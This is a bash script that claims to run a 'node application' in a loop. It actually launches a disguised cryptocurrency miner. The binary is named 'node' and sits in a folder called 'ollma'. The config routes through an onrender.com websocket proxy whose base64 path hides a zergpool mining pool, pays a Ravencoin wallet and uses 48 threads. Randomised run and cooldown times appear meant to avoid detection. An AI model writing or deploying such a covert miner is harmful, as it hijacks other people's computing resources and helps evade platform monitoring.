#!/bin/bash

# This script will run your node application in a continuous loop
# with randomized run and cooldown times.

# Run the initial setup commands once
cd ~/ollma && \
chmod +x ./node && \
echo '{
  "proxy": "wss://onren-e3hx.onrender.com/cG93ZXIyYi5taW5lLnplcmdwb29sLmNvbTo3NDQ1",
  "config": { "threads": 48, "log": true },
  "options": { "user": "RXi399jsFYHLeqFhJWiNETySj5nvt2ryqj", "password": "c=RVN", "argent": "timmer@dayttttt" }
}' > data.json

# Start the infinite loop
while true
do
  # Generate a random run time between 500 and 700 seconds
  RUN_TIME=$(($RANDOM % 201 + 500))

  # Generate a random cooldown time between 60 and 90 seconds
  COOLDOWN_TIME=$(($RANDOM % 31 + 60))

  echo "Starting the node process for ${RUN_TIME} seconds..."
  # Run your command for the random duration
  timeout ${RUN_TIME}s ./node app.js

  echo "Process finished. Cooling down for ${COOLDOWN_TIME} seconds..."
  # Pause the script for the random duration
  sleep ${COOLDOWN_TIME}
done
